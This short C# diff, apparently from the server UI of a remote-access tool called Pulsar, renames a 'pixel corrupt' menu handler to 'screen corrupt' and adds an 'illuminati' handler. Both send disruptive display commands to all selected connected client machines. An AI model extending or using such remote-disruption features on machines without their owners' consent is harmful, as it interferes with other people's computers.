@@ -1474,11 +1474,19 @@ namespace Pulsar.Server.Forms
             }
         }
 
-        private void pixelCorruptToolStripMenuItem_Click(object sender, EventArgs e)
+        private void screenCorruptToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (Client c in GetSelectedClients())
             {
-                c.Send(new DoPixelCorrupt());
+                c.Send(new DoScreenCorrupt());
+            }
+        }
+
+        private void illuminatiToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoIlluminati());
             }
         }
 
